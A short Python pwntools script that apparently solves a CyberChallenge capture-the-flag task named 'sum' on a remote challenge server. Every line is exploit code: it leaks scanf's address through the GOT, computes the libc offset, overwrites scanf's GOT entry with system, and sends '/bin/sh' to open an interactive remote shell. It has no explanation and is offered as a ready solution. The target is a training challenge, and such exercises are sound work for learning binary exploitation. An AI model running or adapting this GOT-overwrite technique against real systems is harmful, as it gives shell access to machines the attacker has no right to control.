from pwn import *

exe = ELF("/home/alessio/Scrivania/tools/CTFs/CyberChallenge/Week 10/Sum/sum")
context.binary = exe
p = remote("sum.challs.cyberchallenge.it", 6014)

print("\n[+] Exploiting...")
abs_scanf = 0x0017c4e0
abs_system = 0x0014f440
scanf_got = 787465

p.sendline(b"-1")
p.recvuntil(">")
p.clean()
p.sendline(b"get " + str(scanf_got).encode())

rel_scanf = int(p.recvline()[:-1])
print("[+] Relative scanf -->  " + hex(rel_scanf))

offset = rel_scanf - abs_scanf
print("[+] Offset -->  " + hex(offset))

rel_system = offset + abs_system
print("[+] Relative system -->  " + hex(rel_system))

p.sendline(b"set " + str(scanf_got).encode() + b" " + str(rel_system).encode())

p.sendline(b"/bin/sh")
p.interactive()
